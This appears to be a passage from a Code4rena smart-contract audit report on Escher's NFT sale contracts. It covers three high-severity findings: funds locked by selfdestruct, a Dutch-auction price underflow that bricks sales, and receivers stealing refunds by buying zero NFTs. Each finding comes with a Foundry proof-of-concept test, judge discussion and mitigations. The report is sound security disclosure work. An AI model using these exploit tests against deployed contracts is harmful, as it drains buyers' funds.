@@ -1,0 +1,70 @@
+[H-01] selfdestruct may cause the funds to be lost
+Submitted bybin2chen, also found bypauliax
+https://github.com/code-423n4/2022-12-escher/blob/5d8be6aa0e8634fdb2f328b99076b0d05fefab73/src/minters/FixedPrice.sol#L110
+https://github.com/code-423n4/2022-12-escher/blob/5d8be6aa0e8634fdb2f328b99076b0d05fefab73/src/minters/OpenEdition.sol#L122
+Impact
+After the contract is destroyed, the subsequent execution of the contract’s#buy()will always succede, the msg.value will be locked in this address.
+Proof of Concept
+When FixedPrice.sol and OpenEdition.sol are finished,selfdestruct()will be executed to destroy the contract.
+But there is a problem with this:
+Suppose when Alice and Bob execute the purchase transaction at the same time, the transaction is in the memory pool (or Alice executes the transaction, but Bob is still operating the purchase in the UI, the UI does not know that the contract has been destroyed)
+If Alice meets the finalId, the contract is destroyed after her transaction ends.
+Note: “When there is no code at the address, the transaction will succeed, and the msg.value will be stored in the contract. Although no code is executed.”
+After that, Bob’s transaction will be executed.
+This way the msg.value passed by Bob is lost and locked forever in the address of this empty code.
+Suggestion: don’t use selfdestruct, use modified state to represent that the contract has completed the sale.
+Recommended Mitigation Steps
+contractFixedPriceisInitializable,OwnableUpgradeable,ISale{...function_end(Salememory_sale)internal{emitEnd(_sale);ISaleFactory(factory).feeReceiver().transfer(address(this).balance/20);-selfdestruct(_sale.saleReceiver);+sale.finalId=sale.currentId+sale.saleReceiver.transfer(address(this).balance);}
+berndartmueller (judge) commented:
+The warden demonstrates an issue that leads to loss of user funds in case the contract is destroyed withselfdestruct.This clearly differentiates from the other submissions outlining the deprecated use ofselfdestructdue toEIP-4758.
+stevennevins (Escher) disputed and commented:
+// SPDX-License-Identifier: MITpragma solidity ^0.8.17;import "forge-std/Test.sol";import {EscherTest, FixedPrice, FixedPriceFactory} from "test/FixedPrice.t.sol";contract Issue296Test is EscherTest {FixedPrice.Sale public fixedSale;FixedPriceFactory public fixedSales;FixedPrice public sale;function setUp() public virtual override {super.setUp();fixedSales = new FixedPriceFactory();fixedSale = FixedPrice.Sale({currentId: uint48(0),finalId: uint48(10),edition: address(edition),price: uint96(uint256(1 ether)),saleReceiver: payable(address(69)),startTime: uint96(block.timestamp)});sale = FixedPrice(fixedSales.createFixedSale(fixedSale));edition.grantRole(edition.MINTER_ROLE(), address(sale));sale.buy{value: 10 ether}(10);}function test_RevertsWhenAfterSelfDestruct_Buy() public {vm.expectRevert();sale.buy{value: 1 ether}(1);}}Any purchases after the selfdestruct would revert as shown above.  In order to accurately mock this in Foundry, you can’t perform the destruction within a test function since everything would be one large transaction and the code would still exist as far as Foundry is concerned because it’s all in the same call context. So you have to move the purchase that selfdestructs the contract into the setup function to demonstrate the behavior.
+berndartmueller (judge) commented:
+@stevennevins You’re right with your Foundry example. However, there are subtle nuances to this that make this finding valid.In your Foundry test, the Solidity function call viasale.buy{value: 1 ether}(1)at the end, uses theextcodesizeopcode to check that the contract that is about to be called actually exists and causes an exception if it does not.However, in the above demonstrated PoC, if a transaction gets executedafterthe contract got destroyed (due to buying the final token id), the transaction does not revert and any value sent along with the transaction will be stored in the contract.I was able to reproduce this behavior with a minimal example contract on Goerli via Remix:// SPDX-License-Identifier: UNLICENSEDpragmasolidity0.8.7;contractSale{functionbuy()externalpayable{_end();}function_end()internal{selfdestruct(payable(msg.sender));}}Calling theSale.buy()function in Remix twice, once with a value of1337 weiand once with333 wei:https://goerli.etherscan.io/tx/0x138d2c061ed547ec5bfd4d7d9b03b519f92b5f63a74b73c45a1af6efe202727chttps://goerli.etherscan.io/tx/0x7ca9032cf79f0a8e29da17061e7eeafb46edfddff96633dc9bbf5957f1aff142As you can see, the first transaction will destroy the contract,1337 weiis sent to the beneficiary (caller). The second transaction succeeds as well. However, the value of333 weiis kept at the address of the destroyed contract.After many considerations, I considerHighto be the appropriate severity. Multiple parallel transactions (e.g. front-runners) will likely try to buy the last NFT IDs, whereas all transactions executed after the last successful buy will render the sentmsg.valuelocked in the destroyed contract. Those users lost funds while not receiving any NFTs.
+
+[H-02]LPDAprice can underflow the price due to bad settings and potentially brick the contract
+Submitted byadriro, also found byAymen0909,Franfran,kiki_dev,Ch_301,Chom,slvDev,lukris02,0xRobocop,minhquanym,immeas,nameruse,0xDecorativePineapple,carrotsmuggler,kaliberpoziomka8552,jonatascm,minhtrng,imare,neumo,ladboy233,Tricko,mahdikarimi,sorrynotsorry,kree-dotcom,pauliax,poirots,bin2chen,jayphbee,0xDave,jadezti,evan,reassor,gz627,0xbepresent,0xA5DF,hihen,chaduke,hansfriese,yixxas,Madalad,HollaDieWaldfee,Parth,0x446576,lumoswiz,danyams,obront,zapaz,rvierdiiev,8olidity, andRuhum
+The dutch auction in theLPDAcontract is implemented by configuring a start price and price drop per second.
+A bad set of settings can cause an issue where the elapsed duration of the sale multiplied by the drop per second gets bigger than the start price and underflows the current price calculation.
+https://github.com/code-423n4/2022-12-escher/blob/main/src/minters/LPDA.sol#L117
+functiongetPrice()publicviewreturns(uint256) {Salememorytemp=sale;(uint256start,uint256end) = (temp.startTime,temp.endTime);if(block.timestamp<start)returntype(uint256).max;if(temp.currentId==temp.finalId)returntemp.finalPrice;uint256timeElapsed=end>block.timestamp?block.timestamp-start:end-start;returntemp.startPrice- (temp.dropPerSecond*timeElapsed);}
+This means that iftemp.dropPerSecond * timeElapsed > temp.startPricethen the unsigned integer result will become negative and underflow, leading to potentially bricking the contract and an eventual loss of funds.
+Impact
+Due to Solidity 0.8 default checked math, the subtraction of the start price and the drop will cause a negative value that will generate an underflow in the unsigned integer type and lead to a transaction revert.
+Calls togetPricewill revert, and since this function is used in thebuyto calculate the current NFT price it will also cause the buy process to fail. The price drop will continue to increase as time passes, making it impossible to recover from this situation and effectively bricking the contract.
+This will eventually lead to a loss of funds because currently the only way to end a sale and transfer funds to the sale and fee receiver is to buy the complete set of NFTs in the sale (i.e. buy everything up to thesale.finalId) which will be impossible if thebuyfunction is bricked.
+Proof of Concept
+In the following test, the start price is 1500 and the duration is 1 hour (3600 seconds) with a drop of 1 per second. At about ~40% of the elapsed time the price drop will start underflowing the price, reverting the calls to bothgetPriceandbuy.
+// SPDX-License-Identifier: MITpragmasolidity^0.8.17;import"forge-std/Test.sol";import{FixedPriceFactory}from"src/minters/FixedPriceFactory.sol";import{FixedPrice}from"src/minters/FixedPrice.sol";import{OpenEditionFactory}from"src/minters/OpenEditionFactory.sol";import{OpenEdition}from"src/minters/OpenEdition.sol";import{LPDAFactory}from"src/minters/LPDAFactory.sol";import{LPDA}from"src/minters/LPDA.sol";import{Escher721}from"src/Escher721.sol";contractAuditTestisTest{addressdeployer;addresscreator;addressbuyer;FixedPriceFactoryfixedPriceFactory;OpenEditionFactoryopenEditionFactory;LPDAFactorylpdaFactory;functionsetUp()public{deployer=makeAddr("deployer");creator=makeAddr("creator");buyer=makeAddr("buyer");vm.deal(buyer,1e18);vm.startPrank(deployer);fixedPriceFactory=newFixedPriceFactory();openEditionFactory=newOpenEditionFactory();lpdaFactory=newLPDAFactory();vm.stopPrank();}functiontest_LPDA_getPrice_NegativePrice()public{// Setup NFT and create salevm.startPrank(creator);Escher721nft=newEscher721();nft.initialize(creator,address(0),"Test NFT","TNFT");// Duration is 1 hour (3600 seconds), with a start price of 1500 and a drop of 1, getPrice will revert and brick the contract at about 40% of the elapsed durationuint48startId=0;uint48finalId=1;uint80startPrice=1500;uint80dropPerSecond=1;uint96startTime=uint96(block.timestamp);uint96endTime=uint96(block.timestamp+1hours);LPDA.Salememorysale=LPDA.Sale(startId,// uint48 currentId;finalId,// uint48 finalId;address(nft),// address edition;startPrice,// uint80 startPrice;0,// uint80 finalPrice;dropPerSecond,// uint80 dropPerSecond;endTime,// uint96 endTime;payable(creator),// address payable saleReceiver;startTime// uint96 startTime;);LPDAlpdaSale=LPDA(lpdaFactory.createLPDASale(sale));nft.grantRole(nft.MINTER_ROLE(),address(lpdaSale));vm.stopPrank();// simulate we are in the middle of the sale durationvm.warp(startTime+0.5hours);vm.startPrank(buyer);// getPrice will revert due to the overflow caused by the price becoming negativevm.expectRevert();lpdaSale.getPrice();// This will also cause the contract to be bricked, since buy needs getPrice to check that the buyer is sending the correct amountuint256amount=1;uint256price=1234;vm.expectRevert();lpdaSale.buy{value:price*amount}(amount);vm.stopPrank();}}
+Recommendation
+Add a validation in theLPDAFactory.createLPDASalefunction to ensure that the given duration and drop per second settings can’t underflow the price.
+require((sale.endTime-sale.startTime) *sale.dropPerSecond<=sale.startPrice,"MAX DROP IS GREATER THAN START PRICE");
+stevennevins (Escher) confirmed
+
+[H-03]saleReceiverandfeeReceivercan steal refunds after sale has ended
+Submitted byimmeas, also found byAkshaySrivastav,cryptonue,saian,minhquanym,0xDecorativePineapple,gzeon,ey88,wait,pauliax,HollaDieWaldfee,jayphbee,bin2chen,evan,reassor,fs0c,hihen,hansfriese,0x52, andaviggiano
+https://github.com/code-423n4/2022-12-escher/blob/main/src/minters/LPDA.sol#L67-L68
+https://github.com/code-423n4/2022-12-escher/blob/main/src/minters/LPDA.sol#L81-L88
+First, lets go over how a buy happens.
+A buyer can buy NFTs at a higher price and then once the auction ends they can userefund()to return the over payments. The effect is that they bought the NFTs at the lowest price (Lowest Price Dutch Auction).
+Now, let’s move on to what happens when the sale ends:
+The sale is considered ended when the last NFT is sold which triggers the payout to the seller and fee collector:
+81:if(newId==temp.finalId) {82:sale.finalPrice=uint80(price);83:uint256totalSale=price*amountSold;84:uint256fee=totalSale/20;85:ISaleFactory(factory).feeReceiver().transfer(fee);86:temp.saleReceiver.transfer(totalSale-fee);87:_end();88:        }
+Earlier there’s also a check that you cannot continue buying once thecurrentIdhas reachedfinalId:
+67:uint48newId=amount+temp.currentId;68:require(newId<=temp.finalId,"TOO MANY");
+However, it is still possible to buy0NFTs for whichever price you want even after the sale has ended. Triggering the “end of sale” snippet again, sincenewIdwill still equaltemp.finalId.
+The attacker,saleReceiver(orfeeReceiver), buys0NFTs for the delta betweentotalSaleand the balance still in the contract (the over payments by buyers). If there is more balance in the contract thantotalSalesthis can be iterated until the contract is empty.
+The attacker has then stolen the over payments from the buyers.
+A buyer can mitigate this by continuously callingrefund()as the price lowers but that would incur a high gas cost.
+Impact
+saleReceiverorfeeReceivercan steal buyers over payments after the sale has ended. Who gains the most depends on circumstances in the auction.
+Proof of Concept
+PoC test intest/LPDA.t.sol:
+functiontest_BuyStealRefund()public{sale=LPDA(lpdaSales.createLPDASale(lpdaSale));edition.grantRole(edition.MINTER_ROLE(),address(sale));// buy most nfts at a higher pricesale.buy{value:9ether}(9);// warp to when price is lowestvm.warp(block.timestamp+1days);uint256price=sale.getPrice();// 0.9 eth// buy last nft at lowest possible pricesale.buy{value:price}(1);uint256contractBalanceAfterEnd=address(sale).balance;uint256receiverBalanceAfterEnd=address(69).balance;console.log("Sale end");console.log("LPDA contract",contractBalanceAfterEnd);// ~ 0.9 ethconsole.log("saleReceiver ",receiverBalanceAfterEnd);// ~9 - fee eth// buy 0 nfts for the totalSales price - current balance// totalSales: 9 eth - contract balance 0.9 eth = ~8.1 ethuint256totalSale=price*10;uint256delta=totalSale-contractBalanceAfterEnd;sale.buy{value:delta}(0);console.log("after steal");console.log("LPDA contract",address(sale).balance);console.log("saleReceiver ",address(69).balance-receiverBalanceAfterEnd-delta);// ~0.45 eth stolen by receiver, 0.45 eth to fees// buyer supposed to get back the ~0.9 ethvm.expectRevert();// EvmError: OutOfFundsale.refund();// nothing to refund}
+Tools Used
+VS Code, Forge
+Recommended Mitigation Steps
+I can think of different options of how to mitigate this:
+Don’t allow buying 0 NFTsDon’t allow buying ifnewId == finalIdsince the sale has ended
+mehtaculous (Escher) disagreed with severity
+
